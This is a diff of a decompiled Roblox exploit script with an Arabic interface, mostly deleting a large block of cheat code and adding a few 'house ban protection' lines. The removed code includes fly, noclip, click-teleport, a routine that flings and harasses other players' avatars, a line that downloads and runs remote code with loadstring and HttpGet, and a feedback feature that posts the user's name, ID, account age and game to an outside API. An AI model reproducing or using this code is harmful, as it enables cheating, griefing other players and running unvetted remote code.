-            vu583.Position = UDim2.new(0.785, 0, 0.865, 0)
-            vu583.Size = UDim2.new(0, 65, 0, 65)
-            vu583.ZIndex = 3
-            vu583.Image = ""
-            vu583.AutoButtonColor = true
-            vu583.Draggable = true
-            v585.Parent = vu583
-            v585.CornerRadius = UDim.new(1, 0)
-            v584.Name = "BtnIcon"
-            v584.Parent = vu583
-            v584.BackgroundTransparency = 1
-            v584.Position = UDim2.new(0.15, 0, 0.15, 0)
-            v584.Size = UDim2.new(0.7, 0, 0.7, 0)
-            v584.ZIndex = 3
-            v584.Image = "rbxasset://textures/ui/mouseLock_off.png"
-            v584.ImageColor3 = Color3.fromRGB(255, 255, 255)
-            v584.ScaleType = Enum.ScaleType.Fit
-            local function v593()
-                local v586 = Instance.new("LocalScript", vu583)
-                game:GetService("UserInputService")
-                local vu587 = false
-                local vu588 = v586.Parent
-                vu588.MouseButton1Click:Connect(function()
-                    vu587 = not vu587
-                    if vu587 then
-                        vu588.BtnIcon.ImageColor3 = Color3.fromRGB(0, 170, 255)
-                        spawn(function()
-                            while true do
-                                if not vu587 then
-                                    return
-                                end
-                                for _ = 0.3, 0.7, 0.1 do
-                                    if not vu587 then
-                                        break
-                                    end
-                                    wait(0.1)
-                                end
-                                for _ = 0.7, 0.3, - 0.1 do
-                                    if not vu587 then
-                                        break
-                                    end
-                                    wait(0.1)
-                                end
-                            end
-                        end)
-                        ForceShiftLock()
-                    else
-                        vu588.BtnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
-                        EndForceShiftLock()
-                    end
-                end)
-                local vu589 = nil
-                local vu590 = UserSettings():GetService("UserGameSettings")
-                local vu591 = nil
-                function ForceShiftLock()
-                    local _, v592 = pcall(function()
-                        return vu590.RotationType
-                    end)
-                    vu589 = v592
-                    vu591 = game:GetService("RunService").RenderStepped:Connect(function()
-                        pcall(function()
-                            vu590.RotationType = Enum.RotationType.CameraRelative
-                        end)
-                    end)
-                end
-                function EndForceShiftLock()
-                    if vu591 then
-                        vu591:Disconnect()
-                        pcall(function()
-                            vu590.RotationType = vu589 or Enum.RotationType.MovementRelative
-                        end)
-                    end
-                end
-            end
-            coroutine.wrap(v593)()
-            SendNotify("System VR7", "\239\191\189\217\133\217\131\217\134\217\131 \216\179\216\173\216\168 \216\167\217\132\216\178\216\177 \217\132\216\167\217\138 \217\133\217\131\216\167\217\134 \216\170\216\177\217\138\216\175\217\135", 3)
-        end
-    end)
-    v254.MouseButton1Click:Connect(function()
-        local v594 = GetRoot(vu38).Position
-        vu38.Character:BreakJoints()
-        pcall(function()
-            vu38.Character.Humanoid.Health = 0
-        end)
-        vu38.CharacterAdded:wait()
-        task.wait(GetPing() + 0.1)
-        TeleportTO(v594.X, v594.Y, v594.Z, "pos", "safe")
-    end)
-    v256.MouseButton1Click:Connect(function()
-        pcall(function()
-            if not (game.Players.LocalPlayer.Character:FindFirstChild("Click Tp") or game.Players.LocalPlayer.Backpack:FindFirstChild("Click Tp")) then
-                game.Players.LocalPlayer:GetMouse()
-                local v595 = Instance.new("Tool")
-                v595.RequiresHandle = false
-                v595.Name = "Click Tp"
-                v595.Activated:connect(function()
-                    local v596 = vu37.LocalPlayer:GetMouse()
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v596.Hit.X, v596.Hit.Y + 3, v596.Hit.Z, select(4, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame:components()))
-                    TeleportTO(pos.X, pos.Y, pos.Z, "pos", nil)
-                end)
-                v595.Parent = game.Players.LocalPlayer.Backpack
-            end
-        end)
-    end)
-    getgenv().Checksub_Button.MouseButton1Click:Connect(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/sub%20checker"))()
-        local vu597 = Instance.new("Sound", game.Workspace)
-        vu597.SoundId = "rbxassetid://3398620867"
-        vu597.Volume = 10
-        vu597.Ended:Connect(function()
-            vu597:Destroy()
-        end)
-        local v598 = vu597
-        vu597.Play(v598)
-    end)
-    getgenv().FeedBack_Button.MouseButton1Click:Connect(function()
-        getgenv().FeedBack_Button_Section = Instance.new("ScrollingFrame")
-        FeedBack_Button_Section.Name = "FeedBack_Button_Section"
-        FeedBack_Button_Section.Parent = vu221
-        FeedBack_Button_Section.Active = true
-        FeedBack_Button_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        FeedBack_Button_Section.BackgroundTransparency = 1
-        FeedBack_Button_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        FeedBack_Button_Section.BorderSizePixel = 0
-        FeedBack_Button_Section.Position = UDim2.new(0, 105, 0, 30)
-        FeedBack_Button_Section.Size = UDim2.new(0, 395, 0, 320)
-        FeedBack_Button_Section.Visible = false
-        FeedBack_Button_Section.CanvasSize = UDim2.new(0, 0, 0, 0)
-        FeedBack_Button_Section.ScrollBarThickness = 5
-        local vu599 = Instance.new("TextBox")
-        vu599.Name = "ProblemInput"
-        vu599.Parent = FeedBack_Button_Section
-        vu599.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        vu599.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        vu599.Position = UDim2.new(0, 25, 0, 15)
-        vu599.Size = UDim2.new(0, 335, 0, 200)
-        vu599.Font = Enum.Font.Oswald
-        vu599.PlaceholderText = "\239\191\189\217\131\216\170\216\168 \217\133\216\180\217\131\217\132\216\170\217\131 \216\167\217\136 \216\167\217\130\216\170\216\177\216\167\216\173\217\131 \217\135\217\134\216\167."
-        vu599.Text = ""
-        vu599.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        vu599.TextSize = 20
-        vu599.TextWrapped = true
-        vu599.TextXAlignment = Enum.TextXAlignment.Right
-        vu599.TextYAlignment = Enum.TextYAlignment.Top
-        local v600 = Instance.new("TextButton")
-        local v601 = Instance.new("TextButton")
-        v600.Name = "Back_Button"
-        v600.Parent = FeedBack_Button_Section
-        v600.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v600.BackgroundTransparency = 0.5
-        v600.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        v600.BorderSizePixel = 0
-        v600.Position = UDim2.new(0, 25, 0, 240)
-        v600.Size = UDim2.new(0, 150, 0, 60)
-        v600.Font = Enum.Font.Oswald
-        v600.Text = "\239\191\189\216\172\217\136\216\185"
-        v600.TextColor3 = Color3.fromRGB(0, 0, 0)
-        v600.TextScaled = true
-        v600.TextSize = 14
-        v600.TextWrapped = true
-        v601.Name = "Back_Button"
-        v601.Parent = FeedBack_Button_Section
-        v601.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v601.BackgroundTransparency = 0.5
-        v601.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        v601.BorderSizePixel = 0
-        v601.Position = UDim2.new(0, 210, 0, 240)
-        v601.Size = UDim2.new(0, 150, 0, 60)
-        v601.Font = Enum.Font.Oswald
-        v601.Text = "\239\191\189\216\177\216\179\216\167\217\132"
-        v601.TextColor3 = Color3.fromRGB(0, 0, 0)
-        v601.TextScaled = true
-        v601.TextSize = 14
-        v601.TextWrapped = true
-        v600.MouseButton1Click:Connect(function()
-            vu238.Visible = true
-            FeedBack_Button_Section:Destroy()
-        end)
-        local vu602 = 0
-        local vu603 = false
-        v601.MouseButton1Click:Connect(function()
-            if vu602 < 5 then
-                if vu599.Text ~= "" then
-                    if vu603 then
-                        SendNotify("System VR7", "\239\191\189\216\177\216\172\217\137 \216\167\217\132\216\167\217\134\216\170\216\184\216\167\216\177 \217\130\217\132\217\138\217\132\216\167", 2)
-                    end
-                    vu603 = true
-                    vu602 = vu602 + 1
-                    local v604 = request
-                    local v605 = {
-                        Url = "https://hajji-api.vercel.app/api/Message",
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        }
-                    }
-                    local v606 = game:GetService("HttpService")
-                    local v607 = v606.JSONEncode
-                    local v608 = {}
-                    local v609 = {}
-                    local v610 = {
-                        title = "Message Sent By New User!",
-                        description = "" .. "**[Player Username (D/U):](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)**  ```" .. game:GetService("Players").LocalPlayer.DisplayName .. " (@" .. game:GetService("Players").LocalPlayer.Name .. ")" .. " " .. loadstring("return game:GetService(\'VoiceChatService\'):IsVoiceEnabledForUserIdAsync(game:GetService(\'Players\').LocalPlayer.UserId) and \'\226\156\148\239\184\143\' or \'\226\157\140\'")() .. "```\n" .. "**[Game Name (" .. tostring(# game:GetService("Players"):GetPlayers()) .. " Player" .. "):](https://www.roblox.com/games/" .. tostring(PlaceId) .. ")**\n```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n" .. "**Player Message:** ```" .. vu599.Text .. "``` \n" .. "**Account Age:** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "Day" .. tostring(" (" .. os.date("%Y/%m/%d", os.time() - game:GetService("Players").LocalPlayer.AccountAge * 86400) .. ")[Y/M/D]") .. "``` \n",
-                        color = 65280
-                    }
-                    __set_list(v609, 1, {
-                        v610
-                    })
-                    v608.embeds = v609
-                    v605.Body = v607(v606, v608)
-                    v604(v605)
-                    SendNotify("System VR7", "\239\191\189\217\133 \216\167\216\177\216\179\216\167\217\132 \216\167\217\132\216\177\216\179\216\167\217\132\216\169", 5)
-                    local vu611 = Instance.new("Sound", game.Workspace)
-                    vu611.SoundId = "rbxassetid://3398620867"
-                    vu611.Volume = 10
-                    vu611.Ended:Connect(function()
-                        vu611:Destroy()
-                    end)
-                    local v612 = vu611
-                    vu611.Play(v612)
-                    vu599.Text = ""
-                    wait(1)
-                    vu603 = false
-                end
+
+                Notify("حماية البيوت", "تم تفعيل الحماية من باند البيوت", 3)
             else
-                SendNotify("System VR7", "\239\191\189\217\130\216\175 \216\170\216\172\216\167\217\136\216\178\216\170 \216\167\217\132\216\173\216\175 \216\167\217\132\216\167\216\175\217\134\217\137 \217\132\217\132\216\177\216\179\216\167\216\166\217\132", 5)
-            end
-        end)
-        vu238.Visible = false
-        FeedBack_Button_Section.Visible = true
-    end)
-    getgenv().HelpHd_Button.MouseButton1Click:Connect(function()
-        SendNotify("System VR7", "\239\191\189\216\167\217\134\216\169 \216\167\217\132\216\167\217\136\216\167\217\133\216\177 \216\170\216\179\216\170\216\174\216\175\217\133 \217\132\217\131\216\170\216\167\216\168\216\169 \216\167\217\136\216\167\217\133\216\177 \216\167\216\175\217\133\217\134 \216\168\216\175\217\136\217\134 \216\167\216\173\216\175 \217\138\216\180\217\136\217\129\217\131", 5)
-        local vu613 = Instance.new("Sound", game.Workspace)
-        vu613.SoundId = "rbxassetid://3398620867"
-        vu613.Volume = 10
-        vu613.Ended:Connect(function()
-            vu613:Destroy()
-        end)
-        local v614 = vu613
-        vu613.Play(v614)
-    end)
-    vu252.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu252)
-        if vu252.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-            local v615, v616, v617 = ipairs(GetRoot(vu38).Parent:GetChildren())
-            local vu618 = {}
-            while true do
-                local v619
-                v617, v619 = v615(v616, v617)
-                if v617 == nil then
-                    break
+                getgenv().antiHouseBan = false
+                
+                if getgenv().banObserverConnection then
+         
+
+
+                    getgenv().banObserverConnection = nil
                 end
-                if v619:IsA("BasePart") then
-                    table.insert(vu618, v619)
-                end
-            end
-            repeat
-                wait(0.1)
-                pcall(function()
-                    local v620, v621, v622 = ipairs(vu618)
-                    while true do
-                        local v623
-                        v622, v623 = v620(v621, v622)
-                        if v622 == nil then
-                            break
-                        end
-                        if vu38.Character[v623.Name].CanCollide then
-                            task.wait()
-                            vu38.Character[v623.Name].CanCollide = false
-                        end
-                    end
-                end)
-            until vu252.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-            local v624, v625, v626 = ipairs(vu618)
-            while true do
-                local v627
-                v626, v627 = v624(v625, v626)
-                if v626 == nil then
-                    break
-                end
-                if not vu38.Character[v627.Name].CanCollide then
-                    task.wait(0.01)
-                    vu38.Character[v627.Name].CanCollide = true
-                end
-            end
-            game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
-        end
-    end)
-    v251.MouseButton1Click:Connect(function()
-        vu43 = GetRoot(vu38).Position
-        SendNotify("System VR7", "\239\191\189\217\133 \216\173\217\129\216\184 \216\167\217\132\216\180\217\138\217\131 \216\168\217\136\217\138\217\134\216\170", 5)
-    end)
-    v248.MouseButton1Click:Connect(function()
-        vu43 = nil
-        SendNotify("System VR7", "\239\191\189\217\133 \216\173\216\176\217\129 \216\167\217\132\216\180\217\138\217\131 \216\168\217\136\217\138\217\134\216\170", 5)
-    end)
-    local vu628 = true
-    local vu629 = {
-        f = 0,
-        b = 0,
-        l = 0,
-        r = 0
-    }
-    local vu630 = {
-        f = 0,
-        b = 0,
-        l = 0,
-        r = 0
-    }
-    local vu631 = nil
-    local vu632 = nil
-    vu259.MouseButton1Click:Connect(function()
-        if game.PlaceId ~= 11379739543 then
-            ChangeToggleColor(vu259)
-            if vu259.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                vu628 = false
-                vu329.Visible = false
-                vu631:Disconnect()
-                vu632:Disconnect()
-                StopAnim()
-            else
-                vu628 = true
-                if game:GetService("UserInputService").TouchEnabled then
-                    vu329.Visible = true
-                end
-                local vu633 = vu38.Character:FindFirstChild("UpperTorso") or vu38.Character:FindFirstChild("Torso")
-                local vu634 = 0
-                local function v637()
-                    local v635 = Instance.new("BodyGyro", vu633)
-                    v635.P = 90000
-                    v635.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
-                    v635.cframe = vu633.CFrame
-                    local v636 = Instance.new("BodyVelocity", vu633)
-                    v636.velocity = Vector3.new(0, 0.1, 0)
-                    v636.maxForce = Vector3.new(9000000000, 9000000000, 9000000000)
-                    PlayAnim(10714347256, 4, 0)
-                    while true do
-                        task.wait()
-                        vu38.Character.Humanoid.PlatformStand = true
-                        if vu629.l + vu629.r ~= 0 or vu629.f + vu629.b ~= 0 then
-                            vu634 = vu634 + vu42 * 0.1
-                            if vu42 < vu634 then
-                                vu634 = vu42
-                            end
-                        elseif vu629.l + vu629.r == 0 and (vu629.f + vu629.b == 0 and vu634 ~= 0) then
-                            vu634 = vu634 - vu42 * 0.1
-                            if vu634 < 0 then
-                                vu634 = 0
-                            end
-                        end
-                        if vu629.l + vu629.r ~= 0 or vu629.f + vu629.b ~= 0 then
-                            v636.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (vu629.f + vu629.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(vu629.l + vu629.r, (vu629.f + vu629.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * vu634
-                            vu630 = {
-                                f = vu629.f,
-                                b = vu629.b,
-                                l = vu629.l,
-                                r = vu629.r
-                            }
-                        elseif vu629.l + vu629.r ~= 0 or (vu629.f + vu629.b ~= 0 or vu634 == 0) then
-                            v636.velocity = Vector3.new(0, 0.1, 0)
-                        else
-                            v636.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (vu630.f + vu630.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(vu630.l + vu630.r, (vu630.f + vu630.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * vu634
-                        end
-                        v635.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(- math.rad((vu629.f + vu629.b) * 50 * vu634 / vu42), 0, 0)
-                        if not vu628 then
-                            vu629 = {
-                                f = 0,
-                                b = 0,
-                                l = 0,
-                                r = 0
-                            }
-                            vu630 = {
-                                f = 0,
-                                b = 0,
-                                l = 0,
-                                r = 0
-                            }
-                            vu634 = 0
-                            v635:Destroy()
-                            v636:Destroy()
-                            vu38.Character.Humanoid.PlatformStand = false
-                            return
-                        end
-                    end
-                end
-                vu631 = vu40.KeyDown:connect(function(p638)
-                    if p638:lower() ~= "w" then
-                        if p638:lower() ~= "s" then
-                            if p638:lower() ~= "a" then
-                                if p638:lower() == "d" then
-                                    vu629.r = 1
-                                    PlayAnim(10147823318, 4.81, 0)
-                                end
-                            else
-                                vu629.l = - 1
-                                PlayAnim(10147823318, 3.55, 0)
-                            end
-                        else
-                            vu629.b = - 1
-                            PlayAnim(10147823318, 4.11, 0)
-                        end
-                    else
-                        vu629.f = 1
-                        if vu38.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 then
-                            PlayAnim(282574440, 4.65, 0)
-                        else
-                            PlayAnim(10714177846, 4.65, 0)
-                        end
-                    end
-                end)
-                vu632 = vu40.KeyUp:connect(function(p639)
-                    if p639:lower() ~= "w" then
-                        if p639:lower() ~= "s" then
-                            if p639:lower() ~= "a" then
-                                if p639:lower() == "d" then
-                                    vu629.r = 0
-                                    PlayAnim(10714347256, 4, 0)
-                                end
-                            else
-                                vu629.l = 0
-                                PlayAnim(10714347256, 4, 0)
-                            end
-                        else
-                            vu629.b = 0
-                            PlayAnim(10714347256, 4, 0)
-                        end
-                    else
-                        vu629.f = 0
-                        PlayAnim(10714347256, 4, 0)
-                    end
-                end)
-                v637()
-            end
-        else
-            SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-            vu259.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-        end
-    end)
-    v331.MouseButton1Down:Connect(function()
-        keypress("0x41")
-    end)
-    v331.MouseButton1Up:Connect(function()
-        keyrelease("0x41")
-    end)
-    v334.MouseButton1Down:Connect(function()
-        keypress("0x53")
-    end)
-    v334.MouseButton1Up:Connect(function()
-        keyrelease("0x53")
-    end)
-    v332.MouseButton1Down:Connect(function()
-        keypress("0x44")
-    end)
-    v332.MouseButton1Up:Connect(function()
-        keyrelease("0x44")
-    end)
-    v333.MouseButton1Down:Connect(function()
-        keypress("0x57")
-    end)
-    v333.MouseButton1Up:Connect(function()
-        keyrelease("0x57")
-    end)
-    v262.MouseButton1Click:Connect(function()
-        local v640, v641, v642 = ipairs(vu38.Backpack:GetChildren())
-        while true do
-            local v643
-            v642, v643 = v640(v641, v642)
-            if v642 == nil then
-                break
-            end
-            if v643.Name == "ClickTarget" then
-                v643:Destroy()
+                Notify("حماية البيوت", "تم إيقاف الحماية من باند البيوت", 3)
             end
         end
-        local v644, v645, v646 = ipairs(vu38.Character:GetChildren())
-        while true do
-            local v647
-            v646, v647 = v644(v645, v646)
-            if v646 == nil then
-                break
-            end
-            if v647.Name == "ClickTarget" then
-                v647:Destroy()
-            end
-        end
-        local v648 = Instance.new("Tool")
-        v648.Name = "ClickTarget"
-        v648.RequiresHandle = false
-        v648.TextureId = "rbxassetid://13769558274"
-        v648.ToolTip = "\239\191\189\216\174\216\170\216\167\216\177 \216\180\216\174\216\181"
-        local function vu651()
-            GetRoot(vu38)
-            local v649 = vu40.Target
-            local v650 = nil
-            if v649 and v649.Parent then
-                if v649.Parent:IsA("Model") then
-                    v650 = game.Players:GetPlayerFromCharacter(v649.Parent)
-                elseif v649.Parent:IsA("Accessory") then
-                    v650 = game.Players:GetPlayerFromCharacter(v649.Parent.Parent)
-                end
-                if v650 then
-                    UpdateTarget(v650)
-                end
-            end
-        end
-        v648.Activated:Connect(function()
-            vu651()
-        end)
-        v648.Parent = vu38.Backpack
-    end)
-    vu267.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu267)
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if vu267.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "System VR7",
-                    Text = "\239\191\189\216\176\216\167 \217\133\216\167\216\183\216\167\216\177 \216\167\217\132\216\167\216\185\216\168 \217\133\216\185\217\134\216\167\217\135\216\167 \216\167\217\132\217\133\216\167\216\168 \217\129\217\138\217\135 \216\173\217\133\216\167\217\138\216\169",
-                    Duration = 3
-                })
-                if game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.RootPart) then
-                    if game.Players.LocalPlayer.Character.Humanoid.RootPart.Velocity.Magnitude < 50 then
-                        getgenv().OldPos = game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame
-                    end
-                    if vu37[vu41].Character.Head then
-                        workspace.CurrentCamera.CameraSubject = vu37[vu41].Character.Head
-                    elseif vu37[vu41].Character:FindFirstChildOfClass("Accessory"):FindFirstChild("Handle") then
-                        workspace.CurrentCamera.CameraSubject = vu37[vu41].Character:FindFirstChildOfClass("Accessory"):FindFirstChild("Handle")
-                    else
-                        workspace.CurrentCamera.CameraSubject = vu37[vu41].Character.Humanoid
-                    end
-                    if not vu37[vu41].Character:FindFirstChildWhichIsA("BasePart") then
-                        return
-                    end
-                    local function vu655(p652, p653, p654)
-                        game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = CFrame.new(p652.Position) * p653 * p654
-                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(p652.Position) * p653 * p654)
-                        game.Players.LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
-                        game.Players.LocalPlayer.Character.Humanoid.RootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
-                    end
-                    local function v665()
-                        getgenv().FPDH = workspace.FallenPartsDestroyHeight
-                        workspace.FallenPartsDestroyHeight = 0 / 0
-                        local vu656 = 0
-                        repeat
-                            task.wait()
-                            pcall(function()
-                                if game.Players.LocalPlayer.Character.Humanoid.RootPart and vu37[vu41].Character.Humanoid then
-                                    if vu37[vu41].Character.Humanoid.RootPart.Velocity.Magnitude >= 50 then
-                                        local v657, v658, v659 = ipairs({
-                                            {
-                                                Vector3.new(0, 1.5, vu37[vu41].Character.Humanoid.WalkSpeed),
-                                                math.rad(90)
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, - vu37[vu41].Character.Humanoid.WalkSpeed),
-                                                0
-                                            },
-                                            {
-                                                Vector3.new(0, 1.5, vu37[vu41].Character.Humanoid.WalkSpeed),
-                                                math.rad(90)
-                                            },
-                                            {
-                                                Vector3.new(0, 1.5, vu37[vu41].Character.Humanoid.RootPart.Velocity.Magnitude / 1.25),
-                                                math.rad(90)
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, - vu37[vu41].Character.Humanoid.RootPart.Velocity.Magnitude / 1.25),
-                                                0
-                                            },
-                                            {
-                                                Vector3.new(0, 1.5, vu37[vu41].Character.Humanoid.RootPart.Velocity.Magnitude / 1.25),
-                                                math.rad(90)
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, 0),
-                                                math.rad(90)
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, 0),
-                                                0
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, 0),
-                                                math.rad(- 90)
-                                            },
-                                            {
-                                                Vector3.new(0, - 1.5, 0),
-                                                0
-                                            }
-                                        })
-                                        while true do
-                                            local v660
-                                            v659, v660 = v657(v658, v659)
-                                            if v659 == nil then
-                                                break
-                                            end
-                                            vu655(vu37[vu41].Character.Humanoid.RootPart, CFrame.new(v660[1]), CFrame.Angles(v660[2], 0, 0))
-                                            task.wait()
-                                        end
-                                    else
-                                        vu656 = vu656 + 100
-                                        local v661, v662, v663 = ipairs({
-                                            Vector3.new(0, 1.5, 0),
-                                            Vector3.new(0, - 1.5, 0),
-                                            Vector3.new(2.25, 1.5, - 2.25),
-                                            Vector3.new(- 2.25, - 1.5, 2.25),
-                                            Vector3.new(0, 1.5, 0),
-                                            Vector3.new(0, - 1.5, 0)
-                                        })
-                                        while true do
-                                            local v664
-                                            v663, v664 = v661(v662, v663)
-                                            if v663 == nil then
-                                                break
-                                            end
-                                            vu655(vu37[vu41].Character.Humanoid.RootPart, CFrame.new(v664) + vu37[vu41].Character.Humanoid.MoveDirection * (vu37[vu41].Character.Humanoid.RootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(vu656), 0, 0))
-                                            task.wait()
-                                        end
-                                    end
-                                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                    if vu37[vu41].Character:FindFirstChild("Head") then
-                                        workspace.CurrentCamera.CameraSubject = vu37[vu41].Character.Head
-                                    end
-                                end
-                            end)
-                        until vu267.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0)
-                    end
-                    local v666 = Instance.new("BodyVelocity")
-                    v666.Name = "Flinger"
-                    v666.Parent = game.Players.LocalPlayer.Character.Humanoid.RootPart
-                    v666.Velocity = Vector3.new(900000000, 900000000, 900000000)
-                    v666.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
-                    game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-                    v665()
-                    v666:Destroy()
-                    game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-                    workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-                    repeat
-                        game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
-                        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
-                        game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
-                        table.foreach(game.Players.LocalPlayer.Character:GetChildren(), function(_, p667)
-                            if p667:IsA("BasePart") then
-                                local v668 = Vector3.new()
-                                p667.RotVelocity = Vector3.new()
-                                p667.Velocity = v668
-                            end
-                        end)
-                        task.wait()
-                    until (game.Players.LocalPlayer.Character.Humanoid.RootPart.Position - getgenv().OldPos.p).Magnitude < 25
-                    workspace.FallenPartsDestroyHeight = getgenv().FPDH
-                    if game.Players.LocalPlayer.Character.Humanoid.Sit then
-                        wait(1)
-                        game.Players.LocalPlayer.Character.Humanoid.sit = false
-                    end
-                end
-            end
-        end
-    end)
-    vu266.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu266)
-            if vu266.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                local v669, v670, v671 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-                while true do
-                    local v672
-                    v671, v672 = v669(v670, v671)
-                    if v671 == nil then
-                        break
-                    end
-                    v672:Stop()
-                end
-                vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                local vu673 = - 1
-                local vu674 = - 2
-                local vu675 = 0.1
-                repeat
-                    pcall(function()
-                        local v676 = vu37[vu41].Character:FindFirstChild("Torso") or vu37[vu41].Character:FindFirstChild("UpperTorso")
-                        if v676.Name == "Torso" then
-                            vu673 = - 0.75
-                        end
-                        vu38.Character.Humanoid.Sit = true
-                        GetRoot(vu38).CFrame = v676.CFrame * CFrame.new(0, vu673, vu674) * CFrame.Angles(math.rad(270), 0, 0)
-                        GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                        vu674 = vu674 + vu675
-                        if vu674 >= - 1 or vu674 <= - 2 then
-                            vu675 = - vu675
-                        end
-                    end)
-                    task.wait()
-                until vu266.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                GetRoot(vu38).Parent.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu265.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu265)
-            if vu265.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                repeat
-                    pcall(function()
-                        game.Workspace.CurrentCamera.CameraSubject = vu37[vu41].Character.Humanoid
-                    end)
-                    task.wait()
